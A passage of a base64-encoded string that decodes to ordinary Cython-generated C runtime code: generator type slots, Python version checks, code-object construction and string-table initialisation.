cl9nZXRzZXRzW10gPSB7XG4gICAgeyJfX25hbWVfXyIsIChnZXR0ZXIpX19QeXhfQ29yb3V0aW5lX2dldF9uYW1lLCAoc2V0dGVyKV9fUHl4X0Nvcm91dGluZV9zZXRfbmFtZSxcbiAgICAgUHlEb2NfU1RSKCJuYW1lIG9mIHRoZSBnZW5lcmF0b3IiKSwgMH0sXG4gICAgeyJfX3F1YWxuYW1lX18iLCAoZ2V0dGVyKV9fUHl4X0Nvcm91dGluZV9nZXRfcXVhbG5hbWUsIChzZXR0ZXIpX19QeXhfQ29yb3V0aW5lX3NldF9xdWFsbmFtZSxcbiAgICAgUHlEb2NfU1RSKCJxdWFsaWZpZWQgbmFtZSBvZiB0aGUgZ2VuZXJhdG9yIiksIDB9LFxuICAgIHsiZ2lfZnJhbWUiLCAoZ2V0dGVyKV9fUHl4X0Nvcm91dGluZV9nZXRfZnJhbWUsIE5VTEwsXG4gICAgIFB5RG9jX1NUUigiRnJhbWUgb2YgdGhlIGdlbmVyYXRvciIpLCAwfSxcbiAgICB7ImdpX3J1bm5pbmciLCBfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmdfZ2V0dGVyLCBOVUxMLCBOVUxMLCBOVUxMfSxcbiAgICB7MCwgMCwgMCwgMCwgMH1cbn07XG5zdGF0aWMgUHlUeXBlX1Nsb3QgX19weXhfR2VuZXJhdG9yVHlwZV9zbG90c1tdID0ge1xuICAgIHtQeV90cF9kZWFsbG9jLCAodm9pZCAqKV9fUHl4X0Nvcm91dGluZV9kZWFsbG9jfSxcbiAgICB7UHlfdHBfdHJhdmVyc2UsICh2b2lkICopX19QeXhfQ29yb3V0aW5lX3RyYXZlcnNlfSxcbiAgICB7UHlfdHBfaXRlciwgKHZvaWQgKilQeU9iamVjdF9TZWxmSXRlcn0sXG4gICAge1B5X3RwX2l0ZXJuZXh0LCAodm9pZCAqKV9fUHl4X0dlbmVyYXRvcl9OZXh0fSxcbiAgICB7UHlfdHBfbWV0aG9kcywgKHZvaWQgKilfX3B5eF9HZW5lcmF0b3JfbWV0aG9kc30sXG4gICAge1B5X3RwX21lbWJlcnMsICh2b2lkICopX19weXhfR2VuZXJhdG9yX21lbWJlcmxpc3R9LFxuICAgIHtQeV90cF9nZXRzZXQsICh2b2lkICopX19weXhfR2VuZXJhdG9yX2dldHNldHN9LFxuICAgIHtQeV90cF9nZXRhdHRybywgKHZvaWQgKikgUHlPYmplY3RfR2VuZXJpY0dldEF0dHJ9LFxuI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkVcbiAgICB7UHlfdHBfZmluYWxpemUsICh2b2lkICopX19QeXhfQ29yb3V0aW5lX2RlbH0sXG4jZW5kaWZcbiNpZiBfX1BZWF9IQVNfUFlfQU1fU0VORCA9PSAxXG4gICAge1B5X2FtX3NlbmQsICh2b2lkICopX19QeXhfQ29yb3V0aW5lX0FtU2VuZH0sXG4jZW5kaWZcbiAgICB7MCwgMH0sXG59O1xuc3RhdGljIFB5VHlwZV9TcGVjIF9fcHl4X0dlbmVyYXRvclR5cGVfc3BlYyA9IHtcbiAgICBfX1BZWF9UWVBFX01PRFVMRV9QUkVGSVggImdlbmVyYXRvciIsXG4gICAgc2l6ZW9mKF9fcHl4X0Nvcm91dGluZU9iamVjdCksXG4gICAgMCxcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMDAwXG4gICAgUHlfVFBGTEFHU19JTU1VVEFCTEVUWVBFIHxcbiNlbmRpZlxuICAgIFB5X1RQRkxBR1NfREVGQVVMVCB8IFB5X1RQRkxBR1NfSEFWRV9HQyB8IFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSB8IF9fUHl4X1RQRkxBR1NfSEFWRV9BTV9TRU5ELFxuICAgIF9fcHl4X0dlbmVyYXRvclR5cGVfc2xvdHNcbn07XG4jaWYgX19QWVhfSEFTX1BZX0FNX1NFTkQgPT0gMlxuc3RhdGljIF9fUHl4X1B5QXN5bmNNZXRob2RzU3RydWN0IF9fcHl4X0dlbmVyYXRvcl9hc19hc3luYztcbiNlbmRpZlxuc3RhdGljIGludCBfX3B5eF9HZW5lcmF0b3JfaW5pdChQeU9iamVjdCAqbW9kdWxlKSB7XG4gICAgX19weXhfbXN0YXRldHlwZSAqbXN0YXRlID0gX19QeXhfUHlNb2R1bGVfR2V0U3RhdGUobW9kdWxlKTtcbiAgICBtc3RhdGUtPl9fcHl4X0dlbmVyYXRvclR5cGUgPSBfX1B5eF9GZXRjaENvbW1vblR5cGVGcm9tU3BlYyhcbiAgICAgICAgbXN0YXRlLT5fX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc1R5cGUsIG1vZHVsZSwgJl9fcHl4X0dlbmVyYXRvclR5cGVfc3BlYywgTlVMTCk7XG4gICAgaWYgKHVubGlrZWx5KCFtc3RhdGUtPl9fcHl4X0dlbmVyYXRvclR5cGUpKSB7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4jaWYgX19QWVhfSEFTX1BZX0FNX1NFTkQgPT0gMlxuICAgIF9fUHl4X1NldEJhY2twb3J0VHlwZUFtU2VuZChtc3RhdGUtPl9fcHl4X0dlbmVyYXRvclR5cGUsICZfX3B5eF9HZW5lcmF0b3JfYXNfYXN5bmMsICZfX1B5eF9Db3JvdXRpbmVfQW1TZW5kKTtcbiNlbmRpZlxuICAgIHJldHVybiAwO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZW5lcmF0b3JfR2V0SW5saW5lZFJlc3VsdChQeU9iamVjdCAqc2VsZikge1xuICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gKF9fcHl4X0Nvcm91dGluZU9iamVjdCopIHNlbGY7XG4gICAgUHlPYmplY3QgKnJldHZhbCA9IE5VTEw7XG4gICAgaWYgKHVubGlrZWx5KF9fUHl4X0Nvcm91dGluZV90ZXN0X2FuZF9zZXRfaXNfcnVubmluZyhnZW4pKSkge1xuICAgICAgICByZXR1cm4gX19QeXhfQ29yb3V0aW5lX0FscmVhZHlSdW5uaW5nRXJyb3IoZ2VuKTtcbiAgICB9XG4gICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kRXgoZ2VuLCBQeV9Ob25lLCAmcmV0dmFsLCAwKTtcbiAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pO1xuICAgICh2b2lkKSByZXN1bHQ7XG4gICAgYXNzZXJ0IChyZXN1bHQgPT0gUFlHRU5fUkVUVVJOIHx8IHJlc3VsdCA9PSBQWUdFTl9FUlJPUik7XG4gICAgYXNzZXJ0ICgocmVzdWx0ID09IFBZR0VOX1JFVFVSTiAmJiByZXR2YWwgIT0gTlVMTCkgfHwgKHJlc3VsdCA9PSBQWUdFTl9FUlJPUiAmJiByZXR2YWwgPT0gTlVMTCkpO1xuICAgIHJldHVybiByZXR2YWw7XG59XG5cblxuc3RhdGljIHVuc2lnbmVkIGxvbmcgX19QeXhfZ2V0X3J1bnRpbWVfdmVyc2lvbih2b2lkKSB7XG4jaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGIwMDAwXG4gICAgcmV0dXJuIFB5X1ZlcnNpb24gJiB+MHhGRlVMO1xuI2Vsc2VcbiAgICBzdGF0aWMgdW5zaWduZWQgbG9uZyBfX1B5eF9jYWNoZWRfcnVudGltZV92ZXJzaW9uID0gMDtcbiAgICBpZiAoX19QeXhfY2FjaGVkX3J1bnRpbWVfdmVyc2lvbiA9PSAwKSB7XG4gICAgICAgIGNvbnN0IGNoYXIqIHJ0X3ZlcnNpb24gPSBQeV9HZXRWZXJzaW9uKCk7XG4gICAgICAgIHVuc2lnbmVkIGxvbmcgdmVyc2lvbiA9IDA7XG4gICAgICAgIHVuc2lnbmVkIGxvbmcgZmFjdG9yID0gMHgwMTAwMDAwMFVMO1xuICAgICAgICB1bnNpZ25lZCBpbnQgZGlnaXQgPSAwO1xuICAgICAgICBpbnQgaSA9IDA7XG4gICAgICAgIHdoaWxlIChmYWN0b3IpIHtcbiAgICAgICAgICAgIHdoaWxlIChcJzBcJyA8PSBydF92ZXJzaW9uW2ldICYmIHJ0X3ZlcnNpb25baV0gPD0gXCc5XCcpIHtcbiAgICAgICAgICAgICAgICBkaWdpdCA9IGRpZ2l0ICogMTAgKyAodW5zaWduZWQgaW50KSAocnRfdmVyc2lvbltpXSAtIFwnMFwnKTtcbiAgICAgICAgICAgICAgICArK2k7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICB2ZXJzaW9uICs9IGZhY3RvciAqIGRpZ2l0O1xuICAgICAgICAgICAgaWYgKHJ0X3ZlcnNpb25baV0gIT0gXCcuXCcpXG4gICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICBkaWdpdCA9IDA7XG4gICAgICAgICAgICBmYWN0b3IgPj49IDg7XG4gICAgICAgICAgICArK2k7XG4gICAgICAgIH1cbiAgICAgICAgX19QeXhfY2FjaGVkX3J1bnRpbWVfdmVyc2lvbiA9IHZlcnNpb247XG4gICAgfVxuICAgIHJldHVybiBfX1B5eF9jYWNoZWRfcnVudGltZV92ZXJzaW9uO1xuI2VuZGlmXG59XG5cblxuc3RhdGljIGludCBfX1B5eF9jaGVja19iaW5hcnlfdmVyc2lvbih1bnNpZ25lZCBsb25nIGN0X3ZlcnNpb24sIHVuc2lnbmVkIGxvbmcgcnRfdmVyc2lvbiwgaW50IGFsbG93X25ld2VyKSB7XG4gICAgY29uc3QgdW5zaWduZWQgbG9uZyBNQUpPUl9NSU5PUiA9IDB4RkZGRjAwMDBVTDtcbiAgICBpZiAoKHJ0X3ZlcnNpb24gJiBNQUpPUl9NSU5PUikgPT0gKGN0X3ZlcnNpb24gJiBNQUpPUl9NSU5PUikpXG4gICAgICAgIHJldHVybiAwO1xuICAgIGlmIChsaWtlbHkoYWxsb3dfbmV3ZXIgJiYgKHJ0X3ZlcnNpb24gJiBNQUpPUl9NSU5PUikgPiAoY3RfdmVyc2lvbiAmIE1BSk9SX01JTk9SKSkpXG4gICAgICAgIHJldHVybiAxO1xuICAgIHtcbiAgICAgICAgY2hhciBtZXNzYWdlWzIwMF07XG4gICAgICAgIFB5T1Nfc25wcmludGYobWVzc2FnZSwgc2l6ZW9mKG1lc3NhZ2UpLFxuICAgICAgICAgICAgICAgICAgICAgICJjb21waWxlIHRpbWUgUHl0aG9uIHZlcnNpb24gJWQuJWQgIlxuICAgICAgICAgICAgICAgICAgICAgICJvZiBtb2R1bGUgXCclLjEwMHNcJyAiXG4gICAgICAgICAgICAgICAgICAgICAgIiVzICJcbiAgICAgICAgICAgICAgICAgICAgICAicnVudGltZSB2ZXJzaW9uICVkLiVkIixcbiAgICAgICAgICAgICAgICAgICAgICAgKGludCkgKGN0X3ZlcnNpb24gPj4gMjQpLCAoaW50KSAoKGN0X3ZlcnNpb24gPj4gMTYpICYgMHhGRiksXG4gICAgICAgICAgICAgICAgICAgICAgIF9fUHl4X01PRFVMRV9OQU1FLFxuICAgICAgICAgICAgICAgICAgICAgICAoYWxsb3dfbmV3ZXIpID8gIndhcyBuZXdlciB0aGFuIiA6ICJkb2VzIG5vdCBtYXRjaCIsXG4gICAgICAgICAgICAgICAgICAgICAgIChpbnQpIChydF92ZXJzaW9uID4+IDI0KSwgKGludCkgKChydF92ZXJzaW9uID4+IDE2KSAmIDB4RkYpXG4gICAgICAgKTtcbiAgICAgICAgcmV0dXJuIFB5RXJyX1dhcm5FeChOVUxMLCBtZXNzYWdlLCAxKTtcbiAgICB9XG59XG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBzdGF0aWMgUHlPYmplY3QqIF9fUHl4X19QeUNvZGVfTmV3KGludCBhLCBpbnQgcCwgaW50IGssIGludCBsLCBpbnQgcywgaW50IGYsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKmMsIFB5T2JqZWN0KiBuLCBQeU9iamVjdCAqdixcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpmdiwgUHlPYmplY3QgKmNlbGwsIFB5T2JqZWN0KiBmbixcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpuYW1lLCBpbnQgZmxpbmUsIFB5T2JqZWN0ICpsbm9zKSB7XG4gICAgICAgIFB5T2JqZWN0ICpleGNlcHRpb25fdGFibGUgPSBOVUxMO1xuICAgICAgICBQeU9iamVjdCAqdHlwZXNfbW9kdWxlPU5VTEwsICpjb2RlX3R5cGU9TlVMTCwgKnJlc3VsdD1OVUxMO1xuICAgICAgICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwYjAwMDBcbiAgICAgICAgUHlPYmplY3QgKnZlcnNpb25faW5mbztcbiAgICAgICAgUHlPYmplY3QgKnB5X21pbm9yX3ZlcnNpb24gPSBOVUxMO1xuICAgICAgICAjZW5kaWZcbiAgICAgICAgbG9uZyBtaW5vcl92ZXJzaW9uID0gMDtcbiAgICAgICAgUHlPYmplY3QgKnR5cGUsICp2YWx1ZSwgKnRyYWNlYmFjaztcbiAgICAgICAgUHlFcnJfRmV0Y2goJnR5cGUsICZ2YWx1ZSwgJnRyYWNlYmFjayk7XG4gICAgICAgICNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwYjAwMDBcbiAgICAgICAgbWlub3JfdmVyc2lvbiA9IDExO1xuICAgICAgICAjZWxzZVxuICAgICAgICBpZiAoISh2ZXJzaW9uX2luZm8gPSBQeVN5c19HZXRPYmplY3QoInZlcnNpb25faW5mbyIpKSkgZ290byBlbmQ7XG4gICAgICAgIGlmICghKHB5X21pbm9yX3ZlcnNpb24gPSBQeVNlcXVlbmNlX0dldEl0ZW0odmVyc2lvbl9pbmZvLCAxKSkpIGdvdG8gZW5kO1xuICAgICAgICBtaW5vcl92ZXJzaW9uID0gUHlMb25nX0FzTG9uZyhweV9taW5vcl92ZXJzaW9uKTtcbiAgICAgICAgUHlfREVDUkVGKHB5X21pbm9yX3ZlcnNpb24pO1xuICAgICAgICBpZiAobWlub3JfdmVyc2lvbiA9PSAtMSAmJiBQeUVycl9PY2N1cnJlZCgpKSBnb3RvIGVuZDtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIGlmICghKHR5cGVzX21vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZSgidHlwZXMiKSkpIGdvdG8gZW5kO1xuICAgICAgICBpZiAoIShjb2RlX3R5cGUgPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKHR5cGVzX21vZHVsZSwgIkNvZGVUeXBlIikpKSBnb3RvIGVuZDtcbiAgICAgICAgaWYgKG1pbm9yX3ZlcnNpb24gPD0gNykge1xuICAgICAgICAgICAgKHZvaWQpcDtcbiAgICAgICAgICAgIHJlc3VsdCA9IFB5T2JqZWN0X0NhbGxGdW5jdGlvbihjb2RlX3R5cGUsICJpaWlpaU9PT09PT2lPT08iLCBhLCBrLCBsLCBzLCBmLCBjb2RlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICBjLCBuLCB2LCBmbiwgbmFtZSwgZmxpbmUsIGxub3MsIGZ2LCBjZWxsKTtcbiAgICAgICAgfSBlbHNlIGlmIChtaW5vcl92ZXJzaW9uIDw9IDEwKSB7XG4gICAgICAgICAgICByZXN1bHQgPSBQeU9iamVjdF9DYWxsRnVuY3Rpb24oY29kZV90eXBlLCAiaWlpaWlpT09PT09PaU9PTyIsIGEscCwgaywgbCwgcywgZiwgY29kZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgYywgbiwgdiwgZm4sIG5hbWUsIGZsaW5lLCBsbm9zLCBmdiwgY2VsbCk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBpZiAoIShleGNlcHRpb25fdGFibGUgPSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplKE5VTEwsIDApKSkgZ290byBlbmQ7XG4gICAgICAgICAgICByZXN1bHQgPSBQeU9iamVjdF9DYWxsRnVuY3Rpb24oY29kZV90eXBlLCAiaWlpaWlpT09PT09PT2lPT09PIiwgYSxwLCBrLCBsLCBzLCBmLCBjb2RlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICBjLCBuLCB2LCBmbiwgbmFtZSwgbmFtZSwgZmxpbmUsIGxub3MsIGV4Y2VwdGlvbl90YWJsZSwgZnYsIGNlbGwpO1xuICAgICAgICB9XG4gICAgZW5kOlxuICAgICAgICBQeV9YREVDUkVGKGNvZGVfdHlwZSk7XG4gICAgICAgIFB5X1hERUNSRUYoZXhjZXB0aW9uX3RhYmxlKTtcbiAgICAgICAgUHlfWERFQ1JFRih0eXBlc19tb2R1bGUpO1xuICAgICAgICBpZiAodHlwZSkge1xuICAgICAgICAgICAgUHlFcnJfUmVzdG9yZSh0eXBlLCB2YWx1ZSwgdHJhY2ViYWNrKTtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgIH1cbiNlbGlmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwMDBcbiAgc3RhdGljIFB5Q29kZU9iamVjdCogX19QeXhfX1B5Q29kZV9OZXcoaW50IGEsIGludCBwLCBpbnQgaywgaW50IGwsIGludCBzLCBpbnQgZixcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmNvZGUsIFB5T2JqZWN0ICpjLCBQeU9iamVjdCogbiwgUHlPYmplY3QgKnYsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpmdiwgUHlPYmplY3QgKmNlbGwsIFB5T2JqZWN0KiBmbixcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKm5hbWUsIGludCBmbGluZSwgUHlPYmplY3QgKmxub3MpIHtcbiAgICBQeUNvZGVPYmplY3QgKnJlc3VsdDtcbiAgICByZXN1bHQgPVxuICAgICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDBcbiAgICAgICAgUHlVbnN0YWJsZV9Db2RlX05ld1dpdGhQb3NPbmx5QXJnc1xuICAgICAgI2Vsc2VcbiAgICAgICAgUHlDb2RlX05ld1dpdGhQb3NPbmx5QXJnc1xuICAgICAgI2VuZGlmXG4gICAgICAgIChhLCBwLCBrLCBsLCBzLCBmLCBjb2RlLCBjLCBuLCB2LCBmdiwgY2VsbCwgZm4sIG5hbWUsIG5hbWUsIGZsaW5lLCBsbm9zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV9ieXRlcyk7XG4gICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGMwMEExXG4gICAgaWYgKGxpa2VseShyZXN1bHQpKVxuICAgICAgICByZXN1bHQtPl9jb19maXJzdHRyYWNlYWJsZSA9IDA7XG4gICAgI2VuZGlmXG4gICAgcmV0dXJuIHJlc3VsdDtcbiAgfVxuI2VsaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBCMiAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG4gICNkZWZpbmUgX19QeXhfX1B5Q29kZV9OZXcoYSwgcCwgaywgbCwgcywgZiwgY29kZSwgYywgbiwgdiwgZnYsIGNlbGwsIGZuLCBuYW1lLCBmbGluZSwgbG5vcylcXFxuICAgICAgICAgIFB5Q29kZV9OZXdXaXRoUG9zT25seUFyZ3MoYSwgcCwgaywgbCwgcywgZiwgY29kZSwgYywgbiwgdiwgZnYsIGNlbGwsIGZuLCBuYW1lLCBmbGluZSwgbG5vcylcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfX1B5Q29kZV9OZXcoYSwgcCwgaywgbCwgcywgZiwgY29kZSwgYywgbiwgdiwgZnYsIGNlbGwsIGZuLCBuYW1lLCBmbGluZSwgbG5vcylcXFxuICAgICAgICAgIFB5Q29kZV9OZXcoYSwgaywgbCwgcywgZiwgY29kZSwgYywgbiwgdiwgZnYsIGNlbGwsIGZuLCBuYW1lLCBmbGluZSwgbG5vcylcbiNlbmRpZlxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeUNvZGVfTmV3KFxuICAgICAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyLFxuICAgICAgICBQeU9iamVjdCAqIGNvbnN0ICp2YXJuYW1lcyxcbiAgICAgICAgUHlPYmplY3QgKmZpbGVuYW1lLFxuICAgICAgICBQeU9iamVjdCAqZnVuY25hbWUsXG4gICAgICAgIGNvbnN0IGNoYXIgKmxpbmVfdGFibGUsXG4gICAgICAgIFB5T2JqZWN0ICp0dXBsZV9kZWR1cF9tYXBcbikge1xuICAgIFB5T2JqZWN0ICpjb2RlX29iaiA9IE5VTEwsICp2YXJuYW1lc190dXBsZV9kZWR1cCA9IE5VTEwsICpjb2RlX2J5dGVzID0gTlVMTCwgKmxpbmVfdGFibGVfYnl0ZXMgPSBOVUxMO1xuICAgIFB5X3NzaXplX3QgdmFyX2NvdW50ID0gKFB5X3NzaXplX3QpIGRlc2NyLm5sb2NhbHM7XG4gICAgUHlPYmplY3QgKnZhcm5hbWVzX3R1cGxlID0gUHlUdXBsZV9OZXcodmFyX2NvdW50KTtcbiAgICBpZiAodW5saWtlbHkoIXZhcm5hbWVzX3R1cGxlKSkgcmV0dXJuIE5VTEw7XG4gICAgZm9yIChQeV9zc2l6ZV90IGk9MDsgaSA8IHZhcl9jb3VudDsgaSsrKSB7XG4gICAgICAgIFB5X0lOQ1JFRih2YXJuYW1lc1tpXSk7XG4gICAgICAgIGlmIChfX1B5eF9QeVR1cGxlX1NFVF9JVEVNKHZhcm5hbWVzX3R1cGxlLCBpLCB2YXJuYW1lc1tpXSkgIT0gKDApKSBnb3RvIGRvbmU7XG4gICAgfVxuICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgdmFybmFtZXNfdHVwbGVfZGVkdXAgPSBQeURpY3RfR2V0SXRlbSh0dXBsZV9kZWR1cF9tYXAsIHZhcm5hbWVzX3R1cGxlKTtcbiAgICBpZiAoIXZhcm5hbWVzX3R1cGxlX2RlZHVwKSB7XG4gICAgICAgIGlmICh1bmxpa2VseShQeURpY3RfU2V0SXRlbSh0dXBsZV9kZWR1cF9tYXAsIHZhcm5hbWVzX3R1cGxlLCB2YXJuYW1lc190dXBsZSkgPCAwKSkgZ290byBkb25lO1xuICAgICAgICB2YXJuYW1lc190dXBsZV9kZWR1cCA9IHZhcm5hbWVzX3R1cGxlO1xuICAgIH1cbiAgICAjZWxzZVxuICAgIHZhcm5hbWVzX3R1cGxlX2RlZHVwID0gUHlEaWN0X1NldERlZmF1bHQodHVwbGVfZGVkdXBfbWFwLCB2YXJuYW1lc190dXBsZSwgdmFybmFtZXNfdHVwbGUpO1xuICAgIGlmICh1bmxpa2VseSghdmFybmFtZXNfdHVwbGVfZGVkdXApKSBnb3RvIGRvbmU7XG4gICAgI2VuZGlmXG4gICAgI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgUHlfSU5DUkVGKHZhcm5hbWVzX3R1cGxlX2RlZHVwKTtcbiAgICAjZW5kaWZcbiAgICBpZiAoX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAoMHgwMzBiMDAwMCkgJiYgbGluZV90YWJsZSAhPSBOVUxMXG4gICAgICAgICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMKSB7XG4gICAgICAgIGxpbmVfdGFibGVfYnl0ZXMgPSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplKGxpbmVfdGFibGUsIGRlc2NyLmxpbmVfdGFibGVfbGVuZ3RoKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFsaW5lX3RhYmxlX2J5dGVzKSkgZ290byBkb25lO1xuICAgICAgICBQeV9zc2l6ZV90IGNvZGVfbGVuID0gKGRlc2NyLmxpbmVfdGFibGVfbGVuZ3RoICogMiArIDQpICYgfjM7XG4gICAgICAgIGNvZGVfYnl0ZXMgPSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplKE5VTEwsIGNvZGVfbGVuKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFjb2RlX2J5dGVzKSkgZ290byBkb25lO1xuICAgICAgICBjaGFyKiBjX2NvZGVfYnl0ZXMgPSBQeUJ5dGVzX0FzU3RyaW5nKGNvZGVfYnl0ZXMpO1xuICAgICAgICBpZiAodW5saWtlbHkoIWNfY29kZV9ieXRlcykpIGdvdG8gZG9uZTtcbiAgICAgICAgbWVtc2V0KGNfY29kZV9ieXRlcywgMCwgKHNpemVfdCkgY29kZV9sZW4pO1xuICAgIH1cbiAgICBjb2RlX29iaiA9IChQeU9iamVjdCopIF9fUHl4X19QeUNvZGVfTmV3KFxuICAgICAgICAoaW50KSBkZXNjci5hcmdjb3VudCxcbiAgICAgICAgKGludCkgZGVzY3IubnVtX3Bvc29ubHlfYXJncyxcbiAgICAgICAgKGludCkgZGVzY3IubnVtX2t3b25seV9hcmdzLFxuICAgICAgICAoaW50KSBkZXNjci5ubG9jYWxzLFxuICAgICAgICAwLFxuICAgICAgICAoaW50KSBkZXNjci5mbGFncyxcbiAgICAgICAgY29kZV9ieXRlcyA/IGNvZGVfYnl0ZXMgOiBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV9ieXRlcyxcbiAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsXG4gICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLFxuICAgICAgICB2YXJuYW1lc190dXBsZV9kZWR1cCxcbiAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsXG4gICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLFxuICAgICAgICBmaWxlbmFtZSxcbiAgICAgICAgZnVuY25hbWUsXG4gICAgICAgIChpbnQpIGRlc2NyLmZpcnN0X2xpbmUsXG4gICAgICAgIChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49ICgweDAzMGIwMDAwKSAmJiBsaW5lX3RhYmxlX2J5dGVzKSA/IGxpbmVfdGFibGVfYnl0ZXMgOiBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV9ieXRlc1xuICAgICk7XG5kb25lOlxuICAgIFB5X1hERUNSRUYoY29kZV9ieXRlcyk7XG4gICAgUHlfWERFQ1JFRihsaW5lX3RhYmxlX2J5dGVzKTtcbiAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICBQeV9YREVDUkVGKHZhcm5hbWVzX3R1cGxlX2RlZHVwKTtcbiAgICAjZW5kaWZcbiAgICBQeV9ERUNSRUYodmFybmFtZXNfdHVwbGUpO1xuICAgIHJldHVybiBjb2RlX29iajtcbn1cblxuXG5zdGF0aWMgaW50IF9fUHl4X0luaXRTdHJpbmdzKF9fUHl4X1N0cmluZ1RhYkVudHJ5IGNvbnN0ICp0LCBQeU9iamVjdCAqKnRhcmdldCwgY29uc3QgY2hhciogY29uc3QqIGVuY29kaW5nX25hbWVzKSB7XG4gICAgd2hpbGUgKHQtPnMpIHtcbiAgICAgICAgUHlPYmplY3QgKnN0cjtcbiAgICAgICAgaWYgKHQtPmlzX3VuaWNvZGUpIHtcbiAgICAgICAgICAgIGlmICh0LT5pbnRlcm4pIHtcbiAgICAgICAgICAgICAgICBzdHIgPSBQeVVuaWNvZGVfSW50ZXJuRnJvbVN0cmluZyh0LT5zKTtcbiAgICAgICAgICAgIH0gZWxzZSBpZiAodC0+ZW5jb2RpbmcpIHtcbiAgICAgICAgICAgICAgICBzdHIgPSBQeVVuaWNvZGVfRGVjb2RlKHQtPnMsIHQtPm4gLSAxLCBlbmNvZGluZ19uYW1lc1t0LT5lbmNvZGluZ10sIE5VTEwpO1xuICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICBzdHIgPSBQeVVuaWNvZGVfRnJvbVN0cmluZ0FuZFNpemUodC0+cywgdC0+biAtIDEpO1xuICAgICAgICAgICAgfVxuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgc3RyID0gUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZSh0LT5zLCB0LT5uIC0gMSk7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKCFzdHIpXG4gICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgICp0YXJnZXQgPSBzdHI7XG4gICAgICAgIGlmIChQeU9iamVjdF9IYXNoKHN0cikgPT0gLTEpXG4gICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgICsrdDtcbiAgICAgICAgKyt0YXJnZXQ7XG4gICAgfVxuICAgIHJldHVybiAwO1xufVxuXG4jaW5jbHVkZSA8c3RyaW5nLmg+XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeV9zc2l6ZV90IF9fUHl4X3NzaXplX3N0cmxlbihjb25zdCBjaGFyICpzKS